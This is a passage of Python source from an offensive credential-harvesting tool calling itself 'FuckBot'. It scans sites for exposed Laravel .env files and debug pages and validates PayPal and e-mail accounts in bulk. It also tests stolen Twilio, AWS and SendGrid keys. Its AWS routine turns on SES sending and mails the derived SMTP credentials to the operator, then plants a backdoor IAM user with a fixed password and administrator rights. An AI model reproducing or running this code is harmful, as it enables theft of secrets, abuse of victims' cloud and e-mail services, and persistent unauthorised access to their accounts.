                    .strip()
                )
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Cache-Control": "max-age=0",
                    "TE": "Trailers",
                }
                response = requests.get(
                    url="https://sonar.omnisint.io/reverse/%s" % ip, headers=headers
                )
                try:
                    parse_json = json.loads(response.text)
                    length_url = len(list(parse_json))
                except:
                    parse_json = False

                if parse_json:
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Found %s URL" % length_url,
                        status=True,
                        mode="Reverse IP Address Lookup",
                    )
                    self.write_file(sonar_live, parse_json)

                else:
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Not Found",
                        status=False,
                        mode="Reverse IP Address Lookup",
                    )
                    self.write_file(sonar_dead, ip)

            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Cannot Connect to Rapid7 Server",
                    status=False,
                    mode="Reverse IP Address Lookup",
                )
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))

    def reverse_ip_address_viewdns(self, counter, length, domain):
        try:
            
            viewdns_live    = self.set_result(filename="reverse_viewdns_live.txt")
            viewdns_dead    = self.set_result(filename="reverse_viewdns_dead.txt")
            viewdns_blocked = self.set_result(filename="reverse_viewdns_blocked.txt")
            
            parse_url = urlparse(domain)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(domain)

            try:
                time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                ip = socket.gethostbyname(
                    target_url.replace("https://", "")
                    .replace("http://", "")
                    .replace("/", "")
                    .strip()
                )

                send_param = {
                    "access_key": self.SCRAPESTACK_KEY,
                    "url": "https://viewdns.com/reverse-ip-lookup/%s" % ip,
                }

                scrape = requests.get(url="https://api.scrapestack.com/scrape", params=send_param)
                try:
                    parse_json = json.loads(scrape.text)
                except:
                    parse_json = False

                if not parse_json:
                    if "Too Many Requests" not in scrape.text:
                        try:
                            parse_raw = re.findall('<div class="col col-30" data-label="Domain name"><a href="https://viewdns.com/view-dns-records/(.*?)">(.*?)</a></div>',
                                scrape.text)
                            find_url = [i[0] for i in parse_raw]
                            
                            length_url = len(list(parse_raw))
                        except:
                            parse_raw = False

                        if parse_raw:
                            
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message="Found %s URL" % length_url,
                                status=True,
                                mode="ViewDNS Reverse IP Address Lookup",
                            )
                            self.write_file(viewdns_live, find_url)

                        else:
                            self.show_status_message(
                                time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message="Not Found",
                                status=False,
                                mode="ViewDNS Reverse IP Address Lookup",
                            )
                            self.write_file(viewdns_dead, ip)
                    else:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=target_url,
                            message="IP Blocked",
                            status=False,
                            mode="ViewDNS Reverse IP Address Lookup",
                        )
                        self.write_file(viewdns_blocked, ip)
                else:
                    if not parse_json["success"]:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=target_url,
                            message="API Error, Reason %s"
                            % parse_json["error"]["type"],
                            status=False,
                            mode="ViewDNS Reverse IP Address Lookup",
                        )
                        self.write_file(viewdns_dead, ip)
                    else:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=target_url,
                            message="API Error, Reason %s"
                            % parse_json["error"]["code"],
                            status=False,
                            mode="ViewDNS Reverse IP Address Lookup",
                        )
                        self.write_file(viewdns_dead, ip)
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Cannot Connect or Timeout",
                    status=False,
                    mode="ViewDNS Reverse IP Address Lookup",
                )
                self.write_file(viewdns_blocked, domain)
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))

    def paypal_validator(self, counter, length, email):
        try:
            
            paypal_live    = self.set_result(filename="paypal_live.txt")
            paypal_dead    = self.set_result(filename="paypal_dead.txt")
            paypal_limited = self.set_result(filename="paypal_limited.txt")

            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            try:
                url = "https://www.paypal.com/cgi-bin/webscr"
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://www.robertkalinkin.com',
                    'Connection': 'keep-alive',
                    'Referer': 'https://www.robertkalinkin.com/index.php?route=checkout/checkout',
                    'Upgrade-Insecure-Requests': '1',
                }
                data = {
                    'cmd': '_cart',
                    'upload': '1',
                    'business': 'indre@robertkalinkin.com',
                    'item_name_1': 'FANTASTIC TWINS IN LEO',
                    'item_number_1': '',
                    'amount_1': '114.88',
                    'quantity_1': '1',
                    'weight_1': '0.86',
                    'on0_1': 'Size - letters',
                    'os0_1': 'S/M',
                    'item_name_2': 'Shipping, Handling, Discounts & Taxes',
                    'item_number_2': '',
                    'amount_2': '31.12',
                    'quantity_2': '1',
                    'weight_2': '0',
                    'currency_code': 'EUR',
                    'first_name': 'Lesley J. Alford',
                    'last_name': '',
                    'address1': '3463 Nutter Street',
                    'address2': '',
                    'city': 'Overland Park',
                    'zip': '64110',
                    'country': 'US',
                    'address_override': '0',
                    'email': email,
                    'invoice': '12536 - Lesley J. Alford ',
                    'lc': 'en',
                    'rm': '2',
                    'no_note': '1',
                    'charset': 'utf-8',
                    'return': 'https://www.robertkalinkin.com/index.php?route=checkout/success',
                    'notify_url': 'https://www.robertkalinkin.com/index.php?route=payment/pp_standard/callback',
                    'cancel_return': 'https://www.robertkalinkin.com/index.php?route=checkout/checkout',
                    'paymentaction': 'sale',
                    'custom': '12536',
                    'bn': 'OpenCart_Cart_WPS'
                }
                send_requests = requests.post(url=url, data=data, headers=headers)
                decode_raw = send_requests.content.decode("utf-8")

                if email in decode_raw:
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=email,
                        message="Live",
                        status=True,
                        mode="PayPal Validator",
                    )
                    self.write_file(paypal_live, email)
                elif "your last action could not be completed" in decode_raw:
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=email,
                        message="Limited",
                        status=False,
                        mode="PayPal Validator",
                    )
                    self.write_file(paypal_limited, email)
                else:
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=email,
                        message="Dead",
                        status=False,
                        mode="PayPal Validator",
                    )
                    self.write_file(paypal_dead, email)
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=email,
                    message="Cannot Connect to PayPal Server",
                    status=False,
                    mode="PayPal Validator",
                )
                self.write_file(paypal_dead, email)

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
    
    def email_validator(self, counter, length, email):
        try:
            deliverable_email = self.set_result(filename="deliverable_email.txt")
            undeliverable_email = self.set_result(filename="undeliverable_email.txt")
            unknown_email = self.set_result(filename="unknown_email.txt")
            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0',
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://www.elevenia.co.id',
                    'Connection': 'keep-alive',
                    'Referer': 'https://www.elevenia.co.id/register/memberRegistForm/memberRegist.do?isSSL=Y',
                    
                }
                data = {
                    'memID': email
                }
                request_validation = requests.post('https://www.elevenia.co.id/register/ValidEmailCheck/isValidEmailAjax.do', headers=headers, data=data)
                raw_result = request_validation.content.decode(encoding="utf-8", errors="ignore")
                
                if raw_result == "Y":
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=email,
                        message="Deliverable",
                        status=True,
                        mode="Email Validator",
                    )
                    self.write_file(deliverable_email, email)
                elif raw_result == "N":
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=email,
                        message="Not Deliverable",
                        status=False,
                        mode="Email Validator",
                    )
                    self.write_file(undeliverable_email, email)
                else:
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=email,
                        message="Unknown",
                        status=False,
                        mode="Email Validator",
                    )
                    self.write_file(unknown_email, email)
                
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=email,
                    message="Cannot Connect to Email Validator Server",
                    status=False,
                    mode="Email Validator",
                )
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            
    def laravel_config_scanner(self, counter, length, url):
        try:
            
            config_vuln = self.set_result(filename="laravel_vuln.txt")
            config_raw  = self.set_result(filename="laravel_raw.txt")
            config_dead = self.set_result(filename="laravel_dead.txt")

            parse_url = urlparse(url)

            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(url)

            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "TE": "Trailers",
            }

            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            try:
                url_config = "/".join([target_url, ".env"])

                get_config = requests.get(
                    url=url_config,
                    headers=headers,
                    timeout=15,
                    verify=False,
                    allow_redirects=False,
                )

                raw_vuln = re.compile(r"([A-Z]+_[A-Z]+\s?=[^\n]+)").search(
                    get_config.text
                )
                vuln_env = (
                    not re.search(r"(\?>|<[^\n]+>)", get_config.text, re.MULTILINE)
                    and raw_vuln
                )

                if vuln_env:
                    debug_mode   = False
                    config_value = get_config.content.decode(encoding="utf-8", errors="ignore")
                    build = "URL=%s\n" % url_config
                    build += config_value

                    self.write_file(config_raw, self.join_string(build))
                    self.write_file(config_vuln, url_config)

                else:
                    get_config = requests.post(
                        url=target_url,
                        data={"0x[]": "x_X"},
                        headers=headers,
                        timeout=5,
                        verify=False,
                        allow_redirects=False,
                    )

                    if "<td>APP_KEY</td>" in get_config.text:
                        debug_mode   = True
                        config_value = get_config.content.decode(encoding="utf-8", errors="ignore")
                        
                        self.write_file(config_vuln, target_url)
                    else:
                        config_value = False

                if config_value:
                    
                    # =========================================================
                    run_grabber = self.get_laravel_config(
                        raw=config_value, url=target_url, debug=debug_mode
                    )
                    # =========================================================
                    

                    if run_grabber:

                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data=target_url,
                            message=list(run_grabber),
                            status=True,
                            mode="Laravel Config Scanner"
                        )
                else:
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Config Not Found",
                        status=False,
                        mode="Laravel Config Scanner"
                    )
                    self.write_file(config_dead, target_url)

            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Can't Connect or Timeout!",
                    status=False,
                    mode="Laravel Config Scanner"
                )

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
    
    def twilio_checker(self, counter, length, acc):
        try:
            
            twilio_live = self.set_result(filename="twilio_live.txt")
            twilio_dead = self.set_result(filename="twilio_dead.txt")
            
            acc   = self.safe_string(acc)
            acc   = acc.split("|")
            account_sid = acc[0]
            auth_token  = acc[1]
            
            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            try:
                client                 = twilio.rest.Client(account_sid, auth_token)
                fetch_balance          = client.api.v2010.balance.fetch()
                account                = client.api.accounts.create()
                incoming_phone_numbers = client.incoming_phone_numbers.list(limit=20)
                get_balance            = fetch_balance.balance
                get_currency           = fetch_balance.currency
                get_account_type       = account.type 
                
                for record in incoming_phone_numbers:
                    get_phone = record.phone_number
                    
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data="|".join([account_sid, auth_token]),
                    message="|".join([get_balance, get_currency, get_account_type, get_phone]),
                    status=True,
                    mode="Twilio Checker"
                )
                
                build = "|".join([account_sid, auth_token, get_currency, get_account_type, get_phone])
                self.write_file(twilio_live, build)
                
            except:
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data="|".join([account_sid, auth_token]),
                    message="Account Key Invalid",
                    status=False,
                    mode="Twilio Checker"
                )
                build = "|".join([account_sid, auth_token])
                self.write_file(twilio_dead, build)
            
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            
    def aws_checker(self, counter, length, acc):
        try:
            
            acc = self.safe_string(acc)
            acc = acc.split("|")
            
            aws_access = acc[0]
            aws_secret = acc[1]
            aws_region = acc[2]
            
            ses_live = self.set_result(filename="ses_live.txt")
            ses_dead = self.set_result(filename="ses_dead.txt")
            
            smtp_ses_success = self.set_result(filename="smtp_ses_success.txt")
            smtp_ses_failed  = self.set_result(filename="smtp_ses_failed.txt")
            
            iam_live = self.set_result(filename="iam_live.txt")
            iam_dead = self.set_result(filename="iam_dead.txt")
            
            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            SMTP_REGIONS = [
                'us-east-2',       # US East (Ohio)
                'us-east-1',       # US East (N. Virginia)
                'us-west-2',       # US West (Oregon)
                
                'ap-south-1',      # Asia Pacific (Mumbai)
                'ap-northeast-2',  # Asia Pacific (Seoul)
                'ap-southeast-1',  # Asia Pacific (Singapore)
                'ap-southeast-2',  # Asia Pacific (Sydney)
                'ap-northeast-1',  # Asia Pacific (Tokyo)
                'ca-central-1',    # Canada (Central)
                'eu-central-1',    # Europe (Frankfurt)
                'eu-west-1',       # Europe (Ireland)
                'eu-west-2',       # Europe (London)
                'sa-east-1',       # South America (Sao Paulo)
                'us-gov-west-1',   # AWS GovCloud (US)
            ]
            
            def sign(key, msg):
                return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()
                
            def calculate_key(secret_access_key, region):
                
                DATE     = "11111111"
                SERVICE  = "ses"
                MESSAGE  = "SendRawEmail"
                TERMINAL = "aws4_request"
                VERSION  = 0x04
                
                SMTP_REGION = [
                    'us-east-2',       # US East (Ohio)
                    'us-east-1',       # US East (N. Virginia)
                    'us-west-2',       # US West (Oregon)
                    'ap-south-1',      # Asia Pacific (Mumbai)
                    'ap-northeast-2',  # Asia Pacific (Seoul)
                    'ap-southeast-1',  # Asia Pacific (Singapore)
                    'ap-southeast-2',  # Asia Pacific (Sydney)
                    'ap-northeast-1',  # Asia Pacific (Tokyo)
                    'ca-central-1',    # Canada (Central)
                    'eu-central-1',    # Europe (Frankfurt)
                    'eu-west-1',       # Europe (Ireland)
                    'eu-west-2',       # Europe (London)
                    'sa-east-1',       # South America (Sao Paulo)
                    'us-gov-west-1',   # AWS GovCloud (US)
                ]
                
                if region not in SMTP_REGION:
                    raise ValueError(f"The {region} Region doesn't have an SMTP endpoint.")
                    
                signature = sign(("AWS4" + secret_access_key).encode('utf-8'), DATE)
                signature = sign(signature, region)
                signature = sign(signature, SERVICE)
                signature = sign(signature, TERMINAL)
                signature = sign(signature, MESSAGE)
                signature_and_version = bytes([VERSION]) + signature
                smtp_password = base64.b64encode(signature_and_version)
                
                return smtp_password.decode('utf-8')
            
            for region in SMTP_REGIONS:
                try:
                    
                    ses = boto3.client("ses", aws_access_key_id=aws_access, aws_secret_access_key=aws_secret, region_name=region)
                    quota = ses.get_send_quota()
                    verified = ses.list_verified_email_addresses()
                    enable_sending = ses.update_account_sending_enabled(Enabled=True)
                    
                    max_send      = quota["Max24HourSend"]
                    send_rate     = quota["MaxSendRate"]
                    last_send     = quota["SentLast24Hours"]
                    list_verified = verified["VerifiedEmailAddresses"]
                    
                    list_ses = [max_send, send_rate, last_send]
                    
                    self.show_status_message(
                        time=time_now, 
                        counter=counter, 
                        length=length, 
                        data="|".join([aws_access, aws_secret, region]), 
                        message="|".join([str(i) for i in list_ses]), 
                        status=True, 
                        mode="AWS Checker"
                    )
                    
                    build_ses = "====================[ $$ FuckBot AWS SES Checker $$ ]====================\n"
                    build_ses += "# AWS Access Key ID      : %s\n" % aws_access
                    build_ses += "# AWS Secret Access Key  : %s\n" % aws_secret
                    build_ses += "# AWS Default Region     : %s\n" % region
                    build_ses += "# Max 24 Hour Send       : %s\n" % max_send
                    build_ses += "# Max Send Rate          : %s\n" % send_rate
                    build_ses += "# Sent Last 24 Hours     : %s\n" % last_send
                    if len(list_verified) != 0:
                        for email_verified in list_verified:
                            build_ses += "# Verified Email Address : %s\n" % email_verified
                    build_ses += "=========================================================================\n"
                    append_ses = self.join_string(build_ses)
                    self.write_file(ses_live, append_ses)
                    
                    if len(list_verified) != 0:

                        from_sender     = list_verified[0]
                        from_name       = "J3mBotMaw0ttz"
                        email_recipient = self.EMAIL_TEST
                        subject         = "FuckBot AWS SES SMTP Creator (%s) " % from_sender
                        smtp_host       = "email-smtp.%s.amazonaws.com" % region
                        smtp_port       = 587 
                        smtp_username   = aws_access
                        smtp_password   = calculate_key(aws_secret, region)
                        
                        
                        build_smtp = "====================[ $$ FuckBot AWS SES Creator $$ ]====================\n"
                        build_smtp += "# AWS Access Key ID     : %s\n" % aws_access
                        build_smtp += "# AWS Secret Access Key : %s\n" % aws_secret
                        build_smtp += "# AWS Default Region    : %s\n" % region
                        build_smtp += "# Max 24 Hour Send      : %s\n" % max_send
                        build_smtp += "# Max Send Rate         : %s\n" % send_rate
                        build_smtp += "# Sent Last 24 Hours    : %s\n" % last_send
                        build_smtp += "# Host                  : email.%s.amazonaws.com\n" % region
                        build_smtp += "# Port                  : 587\n"
                        build_smtp += "# Username              : %s\n" % aws_access
                        build_smtp += "# Password              : %s\n" % calculate_key(aws_secret, region)
                        build_smtp += "# Send To               : %s\n" % email_recipient
                        for from_email in list_verified:
                            build_smtp += "# From Email            : %s\n" % from_email
                        build_smtp += "=========================================================================" + "\n"
                        append_smtp = self.join_string(build_smtp)
                        
                        BODY_TEXT = append_smtp
                        
                        BODY_HTML = "<html>\n"
                        BODY_HTML += "<head>\n"
                        BODY_HTML += "<body>\n"
                        BODY_HTML += "<pre>\n"
                        BODY_HTML += BODY_TEXT
                        BODY_HTML += "</pre>\n"
                        BODY_HTML += "</body>\n"
                        BODY_HTML += "</html>\n"
                        BODY_MESSAGE = self.join_string(BODY_HTML)
                        
                        msg            = MIMEMultipart('alternative')
                        msg['Subject'] = subject
                        msg['From']    = email.utils.formataddr((from_name, from_sender))
                        msg['To']      = email_recipient
                        
                        part1 = MIMEText(BODY_TEXT, 'plain')
                        part2 = MIMEText(BODY_MESSAGE, 'html')
                        
                        msg.attach(part1)
                        msg.attach(part2)
                        
                        try:  
                            server = smtplib.SMTP(smtp_host, smtp_port)
                            server.ehlo()
                            server.starttls()
                            server.ehlo()
                            server.login(smtp_username, smtp_password)
                            server.sendmail(from_sender, email_recipient, msg.as_string())
                            server.close()
                            
                            self.show_status_message(
                                time=time_now, 
                                counter=counter, 
                                length=length, 
                                data="|".join([smtp_host, smtp_port, smtp_username, smtp_password, email_recipient]), 
                                message="Send Success!", 
                                status=True,
                                mode="AWS Checker"
                            )
                            self.write_file(smtp_ses_success, append_smtp)

                        except smtplib.SMTPResponseException as Error:
                            self.show_status_message(
                                time=time_now, 
                                counter=counter, 
                                length=length,
                                data="|".join([str(smtp_host), str(smtp_port), str(smtp_username), str(smtp_password), str(email_recipient)]), 
                                message=Error.smtp_error, 
                                status=False, 
                                mode="AWS Checker"
                            )
                            self.write_file(smtp_ses_failed, append_smtp)
                        
                    try:
                        
                        iam = boto3.client('iam', aws_access_key_id=aws_access, aws_secret_access_key=aws_secret, region_name=region)
                        
                        username = "iDevXploit"
                        password = "MCDonald2021D#1337"
                        
                        create_user = iam.create_user(UserName=username)
                        
                        get_username = create_user["User"]["UserName"]
                        get_arn      = create_user["User"]["Arn"]
                        
                        create_password = iam.client.create_login_profile(Password=password, PasswordResetRequired=False, UserName=username)
                        
                        add_admin = iam.attach_user_policy(PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess', UserName=username)
                        
                        build_iam = "====================[ $$ FuckBot AWS IAM Creator $$ ]====================\n"
                        build_iam += "# Console URL : https://console.aws.amazon.com/iam/home\n"
                        build_iam += "# Account ID  : %s\n" % get_arn
                        build_iam += "# Username    : %s\n" % get_username
                        build_iam += "# Password    : %s\n" % get_arn 
                        build_iam += "=========================================================================\n"
                        append_iam = self.join_string(build_iam)
                        self.write_file(iam_live, append_iam)
                        
                    except botocore.exceptions.ClientError as Error:
                        self.show_status_message(
                            time=time_now,
                            counter=counter,
                            length=length,
                            data="|".join([aws_access, aws_secret, aws_region]),
                            message=Error.response["Error"]["Message"],
                            status=False,
                            mode="AWS Checker"
                        )
                        build = "|".join([aws_access, aws_secret, region])
                        self.write_file(iam_dead, build)
                    
                except botocore.exceptions.ClientError as Error:
                    self.show_status_message(
                        time=time_now,
                        counter=counter,
                        length=length,
                        data="|".join([aws_access, aws_secret, aws_region]),
                        message=Error.response["Error"]["Message"],
                        status=False,
                        mode="AWS Checker"
                    )
                    build = "|".join([aws_access, aws_secret, region])
                    self.write_file(ses_dead, build)
                    
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            
    def ec_checker(self, counter, length, key):
        
        acc = self.safe_string(key)
        acc = acc.split("|")
            
        _access = acc[0]
        _secret = acc[1]
        _region = acc[2]
        
        time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
        ec_live = self.set_result(filename="ec2_live.txt")
        ec_dead = self.set_result(filename="ec2_dead.txt")
        
        get_service_region = self.set_result(filename="get_service_region.txt")
        bad_result = self.set_result("ec2_bad_result.txt")
        
        try:
            
            print(Color.BLUE("[+] ================================================== [+]"))
            print(Color.YELLOW("[+] Setup AWS Access Key ID : %s" % _access))
            subprocess.call("aws configure set aws_access_key_id %s" % _access, shell=True)
            subprocess.call("aws configure set aws_secret_access_key  %s" % _secret, shell=True)
            print(Color.YELLOW("[+] Setup AWS Secret Access Key : %s" % _secret))
            subprocess.call("aws configure set default.region  %s" % _region, shell=True)
            print(Color.YELLOW("[+] Setup AWS Region : %s" % _region))
            
            call = subprocess.check_output('aws service-quotas list-service-quotas --service-code ec2 --query "Quotas[*].{QuotaName:QuotaName,Value:Value}"', shell=True).decode()
            
            try:
                parse = json.loads(call)
                try:
                    if parse:
                        print(Color.GREEN("[+] AWS Access Key ID : %s" % _access))
                        print(Color.GREEN("[+] AWS Secret Access Key : %s" % _secret))
                        print(Color.GREEN("[+] AWS Region : %s" % _region))
                        print(Color.GREEN("[+] AWS Service : "))
                        
                        build_ec = "AWS_ACCESS_KEY_ID : %s\n" % _access
                        build_ec += "AWS_SECRET_ACCESS_KEY : %s\n" % _secret
                        build_ec += "AWS_DEFAULT_REGION : %s\n" % _region
                        build_ec += "AWS_SERVICE : "
                        
                        join_ec = self.join_string(build_ec)
                        self.write_file(get_service_region, join_ec)
                        region = ["us-east-1", "us-east-2", "us-west-1", "us-west-2", "af-south-1", "ap-east-1", "ap-south-1", "ap-northeast-1", "ap-northeast-2", "ap-northeast-3", "ap-southeast-1", "ap-southeast-2", "ca-central-1", "eu-central-1", "eu-west-1", "eu-west-2", "eu-west-3", "eu-south-1", "eu-north-1", "me-south-1", "sa-east-1"]
                        for reg in region:
                            print(Color.YELLOW("\n Region : %s" % reg))
                            query = 'aws service-quotas list-service-quotas --service-code ec2 --region '+reg+' --query \"Quotas[*].{QuotaName:QuotaName,Value:Value}\" --output table'
                            try:
                                result = subprocess.check_output(query,shell=True).decode()
                                print(Color.GREEN(result))
                            except:
                                result = "This Account Not Subscribed in %s Region" % reg
                                print(Color.RED(result))
                            
                            details = "Region : %s \n\n %s " % (reg, result)
                            self.write_file(get_service_region, details)
                            
                        print(Color.BLUE("[+] ================================================== [+]"))
                        self.write_file(ec_live, key)
                        
                    else:
                        print(Color.RED("[+] AWS Access Key ID : %s" % _access))
                        print(Color.RED("[+] AWS Secret Access Key : %s" % _secret))
                        print(Color.RED("[+] AWS Region : %s" % _region))
                        print(Color.RED("[+] AWS Status : Dead"))
                        
                        build_ec = "AWS_ACCESS_KEY_ID : %s\n" % _access
                        build_ec += "AWS_SECRET_ACCESS_KEY : %s\n" % _secret
                        build_ec += "AWS_DEFAULT_REGION : %s\n" % _region
                        
                        join_ec = self.join_string(build_ec)
                        self.write_file(bad_result, join_ec)
                        self.write_file(ec_dead, key)
                        
                except Exception as e:
                    print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
                    pass
                
            except Exception:
                pass
            
        except:
            
            print(Color.RED("[+] AWS Access Key ID : %s" % _access))
            print(Color.RED("[+] AWS Secret Access Key : %s" % _secret))
            print(Color.RED("[+] AWS Region : %s" % _region))
            print(Color.RED("[+] AWS Status : Dead"))
                        
            build_ec = "AWS_ACCESS_KEY_ID : %s\n" % _access
            build_ec += "AWS_SECRET_ACCESS_KEY : %s\n" % _secret
            build_ec += "AWS_DEFAULT_REGION : %s\n" % _region
                        
            join_ec = self.join_string(build_ec)
            self.write_file(bad_result, join_ec)
            #self.write_file(ec_dead, key)
        
    
    def sendgrid_checker(self, counter, length, api_key):
        try:
            sendgrid_live = self.set_result("sendgrid_live.txt")
            sendgrid_dead = self.set_result("sendgrid_dead.txt")
            
            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            try:
                
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                    "Authorization": "Bearer " + api_key
                }
                
                #sg = SendGridAPIClient(api_key)
                
                
                req_info = requests.get('https://api.sendgrid.com/v3/user/credits', headers=headers)
                req_user = requests.get('https://api.sendgrid.com/v3/user/email',headers=headers)
                
                get_used = json.loads(req_info.text)["used"]
                get_limit = json.loads(req_info.text)["total"]
                get_from = json.loads(req_user.text)["email"]
                
                
                self.show_status_message(
                    time=time_now,
                    counter=counter,
                    length=length,
                    data=api_key,
                    message=["|".join([str(get_limit), str(get_used), str(get_from)])],
                    status=True,
                    mode="Sendgrid Checker"
                )
                
